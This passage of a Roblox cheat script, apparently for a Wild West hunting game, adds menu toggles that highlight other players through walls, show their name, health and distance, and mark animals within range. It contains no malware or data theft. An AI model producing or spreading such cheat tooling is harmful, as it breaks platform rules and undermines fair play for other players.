        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("FortCassidy", true, false)
    end
})

local VisualTab = Window:MakeTab({
    Name = "Visual",
    Icon = "rbxassetid://72355942268793",
    PremiumOnly = false
})


local Section = VisualTab:AddSection({
	Name = "Esp Players"
})

-- Obter o jogador local
local localPlayer = game:GetService("Players").LocalPlayer

-- VariÃ¡vel para controlar o toggle
local chamsEnabled = false

-- FunÃ§Ã£o para criar o Highlight
function createChams(player, teamColor)
    -- Certificar-se de que o jogador tenha um personagem e que nÃ£o seja o jogador local
    if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        -- Verificar se o highlight jÃ¡ existe e removÃª-lo para evitar duplicados
        if player.Character:FindFirstChild("Highlight") then
            player.Character.Highlight:Destroy()
        end

        -- Criar um novo highlight
        local highlight = Instance.new("Highlight")
        highlight.Parent = player.Character
        highlight.Adornee = player.Character

        -- Configurar a cor com base no time
        highlight.FillColor = teamColor

        -- Configurar a borda branca fina
        highlight.OutlineColor = Color3.new(1, 1, 1)
        highlight.OutlineTransparency = 0.5
        highlight.FillTransparency = 0.3 -- Ajuste a transparÃªncia conforme desejar
    end
end

-- FunÃ§Ã£o para aplicar os Chams a todos os jogadores
function applyChamsToPlayers()
    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
        if player ~= localPlayer then -- Ignorar o jogador local
            local teamColor = player.TeamColor.Color -- Cor do time do jogador
            createChams(player, teamColor)
        end
    end
end

-- FunÃ§Ã£o para atualizar Chams com base no toggle
function updateChams()
    if chamsEnabled then
        applyChamsToPlayers()
    else
        -- Remover highlights existentes
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Highlight") then
                player.Character.Highlight:Destroy()
            end
        end
    end
end

-- Criar o toggle para ativar/desativar Chams usando o novo formato
VisualTab:AddToggle({
    Name = "Chams [Hitbox Players]",
    Default = false,
    Callback = function(Value)
        chamsEnabled = Value
        updateChams() -- Atualiza os Chams sempre que o toggle mudar
    end    
})

-- Aplicar os Chams a novos jogadores que entrarem, se o toggle estiver ativado
game:GetService("Players").PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        if chamsEnabled and player ~= localPlayer then -- Ignorar o jogador local
            local teamColor = player.TeamColor.Color
            createChams(player, teamColor)
        end
    end)
end)

-- Aplicar os Chams a todos os jogadores atuais, exceto o jogador local, se o toggle estiver ativado
updateChams()
--âš ï¸âš ï¸âš ï¸âš ï¸


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

_G.EspName = false -- VariÃ¡vel para controlar o estado do toggle do nome
_G.EspHealth = false -- VariÃ¡vel para controlar o estado do toggle da saÃºde
_G.EspDistance = false -- VariÃ¡vel para controlar o estado do toggle da distÃ¢ncia

-- Tabela para armazenar os ESPs de cada jogador
local espInstances = {}

-- FunÃ§Ã£o para criar o ESP
local function createESP(player)
    local character = player.Character
    if character and player ~= Players.LocalPlayer then
        -- Remover ESP antigo, se existir
        if espInstances[player.UserId] then
            espInstances[player.UserId].textLabel:Destroy()
            espInstances[player.UserId] = nil
        end

        -- Criar um BillboardGui para mostrar as informaÃ§Ãµes
        local textLabel = Instance.new("BillboardGui")
        textLabel.Size = UDim2.new(0, 100, 0, 70)
        textLabel.Adornee = character:FindFirstChild("Head")
        textLabel.AlwaysOnTop = true
        textLabel.ExtentsOffset = Vector3.new(0, 2, 0)

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundTransparency = 1
        frame.Parent = textLabel

        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(1, 0, 0, 30)
        nameLabel.BackgroundTransparency = 1
        nameLabel.TextColor3 = player.TeamColor.Color
        nameLabel.Font = Enum.Font.SourceSans
        nameLabel.TextSize = 14
        nameLabel.TextStrokeTransparency = 0
        nameLabel.Position = UDim2.new(0, 0, 0, 0)
        nameLabel.Parent = frame

        local healthLabel = Instance.new("TextLabel")
        healthLabel.Size = UDim2.new(1, 0, 0, 25)
        healthLabel.BackgroundTransparency = 1
        healthLabel.TextColor3 = player.TeamColor.Color
        healthLabel.Font = Enum.Font.SourceSans
        healthLabel.TextSize = 14
        healthLabel.TextStrokeTransparency = 0
        healthLabel.Position = UDim2.new(0, 0, 0, 12)
        healthLabel.Parent = frame

        local distanceLabel = Instance.new("TextLabel")
        distanceLabel.Size = UDim2.new(1, 0, 0, 25)
        distanceLabel.BackgroundTransparency = 1
        distanceLabel.TextColor3 = player.TeamColor.Color
        distanceLabel.Font = Enum.Font.SourceSans
        distanceLabel.TextSize = 14
        distanceLabel.TextStrokeTransparency = 0
        distanceLabel.Position = UDim2.new(0, 0, 0, 20)
        distanceLabel.Parent = frame

        espInstances[player.UserId] = {textLabel = textLabel, nameLabel = nameLabel, healthLabel = healthLabel, distanceLabel = distanceLabel}

        -- Atualiza o texto do ESP a cada segundo
        coroutine.wrap(function()
            while _G.EspName or _G.EspHealth or _G.EspDistance do
                wait(1)
                if not player.Character or not player.Character:FindFirstChild("Humanoid") then
                    break
                end

                local humanoid = player.Character:FindFirstChild("Humanoid")
                local distance = (Players.LocalPlayer.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude
                
                nameLabel.Text = _G.EspName and player.Name or ""
                healthLabel.Text = _G.EspHealth and string.format("Vida: %d", humanoid.Health) or ""
                distanceLabel.Text = _G.EspDistance and string.format("DistÃ¢ncia: %.1f", distance) or ""
                
                -- Atualizar cor do texto caso o time mude
                nameLabel.TextColor3 = player.TeamColor.Color
                healthLabel.TextColor3 = player.TeamColor.Color
                distanceLabel.TextColor3 = player.TeamColor.Color
            end
            
            textLabel:Destroy()
            espInstances[player.UserId] = nil
        end)()
        
        textLabel.Parent = workspace
    end
end

-- FunÃ§Ã£o para iniciar o ESP para todos os jogadores
local function startESPPlayerScript()
    for _, player in pairs(Players:GetPlayers()) do
        createESP(player)

        player.CharacterAdded:Connect(function()
            wait(1)
            createESP(player)
        end)
    end

    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            wait(1)
            createESP(player)
        end)
    end)

    Players.PlayerRemoving:Connect(function(player)
        if espInstances[player.UserId] then
            espInstances[player.UserId].textLabel:Destroy()
            espInstances[player.UserId] = nil
        end
    end)
end

-- FunÃ§Ã£o para remover todos os ESPs
local function removeAllESP()
    for _, instance in pairs(espInstances) do
        if instance.textLabel then
            instance.textLabel:Destroy()
        end
    end
    espInstances = {}
end

-- Toggle para ativar/desativar o ESP do nome
VisualTab:AddToggle({
    Name = "Esp Player [Name]",
    Default = false,
    Callback = function(value)
        _G.EspName = value
        if value then
            startESPPlayerScript()
        else
            removeAllESP()
        end
    end
})

-- Toggle para ativar/desativar o ESP da saÃºde
VisualTab:AddToggle({
    Name = "Esp Player [Health]",
    Default = false,
    Callback = function(value)
        _G.EspHealth = value
        if value then
            startESPPlayerScript()
        else
            removeAllESP()
        end
    end
})

-- Toggle para ativar/desativar o ESP da distÃ¢ncia
VisualTab:AddToggle({
    Name = "Esp Player [Distance]",
    Default = false,
    Callback = function(value)
        _G.EspDistance = value
        if value then
            startESPPlayerScript()
        else
            removeAllESP()
        end
    end
})

  local Section = VisualTab:AddSection({
	Name = "Esp Animals"
})

local toggleActive = false

-- CriaÃ§Ã£o do novo botÃ£o toggle
VisualTab:AddToggle({
    Name = "Esp [Animals]",  -- Nome do botÃ£o
    Default = false,         -- Estado inicial (desativado)
    Callback = function(Value)
        toggleActive = Value  -- Atualiza o estado do toggle
    end    
})

-- Lista de nomes dos animais e suas partes relevantes
local animalData = {
    ["Buffalo"] = "Torso",
    ["Wolf"] = "Head",
    ["Deer"] = "Torso",
    ["Fox"] = "Head",
    ["Bear"] = "Torso",
    ["Coyote"] = "Head",
    ["Bison"] = "Torso",
}

-- Lista de animais "Dire" e suas partes relevantes
local direAnimalData = {
    ["LegendaryWolf"] = "Torso",
    ["DireWolf"] = "Head", 
    ["LegendaryDeerBuck"] = "Head",
    ["LegendaryFox"] = "Head",
    ["GrizzlyBear"] = "Torso",
    ["LegendaryBison"] = "Torso"  
}

-- Armazenar referÃªncias aos ESPs criados
local espCache = {}

-- FunÃ§Ã£o para criar um marcador ESP
local function createESP(model, part, displayName, color, distance, health)
    -- Remove o ESP antigo, se existir
    if espCache[model] then
        espCache[model]:Destroy()
    end

    local esp = Instance.new("BillboardGui")
    esp.Adornee = part
    esp.Size = UDim2.new(0, 100, 0, 50)
    esp.AlwaysOnTop = true
    esp.Parent = part

    local textLabel = Instance.new("TextLabel")
    textLabel.Text = string.format("%s\nDistÃ¢ncia: %d m\nVida: %d", displayName, math.floor(distance), health)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = color  -- Cor do texto
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Cor do contorno (preto)
    textLabel.Parent = esp

    espCache[model] = esp
end

-- FunÃ§Ã£o para calcular a distÃ¢ncia entre dois pontos
local function calculateDistance(pos1, pos2)
    return (pos1 - pos2).Magnitude
end

-- FunÃ§Ã£o para verificar e adicionar ESP aos animais
local function checkForAnimals(character)
    if not toggleActive then
        -- Se o toggle estiver desativado, destrÃ³i todos os ESPs e limpa o cache
        for model, esp in pairs(espCache) do
            esp:Destroy()
            espCache[model] = nil
        end
        return
    end

    local playerPos = character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position

    -- Atualizar ESPs
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("Model") then
            -- Calcula a distÃ¢ncia entre o jogador e o animal
            local partPos = object:FindFirstChildWhichIsA("BasePart") and object:FindFirstChildWhichIsA("BasePart").Position
            if partPos and playerPos then
                local distance = calculateDistance(playerPos, partPos)

                -- Limite de alcance de 1000 metros
                if distance <= 1000 then
                    -- Verifica se o animal tem um Humanoid ou algo que tenha "Health"
                    local humanoid = object:FindFirstChildOfClass("Humanoid")
                    local health = humanoid and humanoid.Health or 0

                    -- Checa primeiro se Ã© um animal "Dire" e cria o ESP ciano
                    local isDire = false
                    for direAnimalName, bodyPart in pairs(direAnimalData) do
                        if string.find(object.Name, direAnimalName) and object:FindFirstChild(bodyPart) then
                            createESP(object, object[bodyPart], direAnimalName, Color3.new(0, 1, 1), distance, health) -- Ciano
                            isDire = true -- Marca como animal "Dire"
                            break
                        end
                    end

                    -- Se nÃ£o for um animal "Dire", cria o ESP laranja para os animais normais
                    if not isDire then
                        for animalName, bodyPart in pairs(animalData) do
                            if string.find(object.Name, animalName) and object:FindFirstChild(bodyPart) then
                                createESP(object, object[bodyPart], animalName, Color3.new(1, 0.5, 0), distance, health) -- Laranja
                            end
                        end
                    end
                end
            end
        end
    end

    -- Remove ESPs que nÃ£o estÃ£o mais presentes
    for model, esp in pairs(espCache) do
        if not model.Parent then
            esp:Destroy()
            espCache[model] = nil
        end
    end
end

-- FunÃ§Ã£o principal que cuida da reinicializaÃ§Ã£o do personagem
local function main()
    while true do
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

        -- Verifica se o toggle estÃ¡ ativo antes de verificar os animais
        checkForAnimals(character)

        -- Conectar a funÃ§Ã£o de verificaÃ§Ã£o aos eventos de morte e reaparecimento
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Died:Connect(function()
                -- Esperar o personagem ser reiniciado
                repeat wait() until player.Character
                -- Continuar a verificaÃ§Ã£o com o novo personagem
                character = player.Character
            end)
        end

        -- Aguardar 1 segundo antes da prÃ³xima verificaÃ§Ã£o
        wait(1)
    end
end

local CreditsTab = Window:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://139489660713884",
    PremiumOnly = false
})

local CreditsSection = CreditsTab:AddSection({
    Name = "Credits to creators"
})

CreditsSection:AddLabel("Script Developed by: Elixir Client")

CreditsTab:AddDropdown({
    Name = "Developers",
    Default = "",
    Options = {"Mentalist", "SrMagnata"},
    Callback = function(Value)
        local creations = {
            Mentalist = "Owner",
            Aspherian = "Head Developer"
        }
        print(Value .. " created " .. creations[Value])
    end
})

CreditsSection:AddLabel("Report Non-Functional Bugs Scripts on Discord")

CreditsTab:AddButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/exclient")
    end
})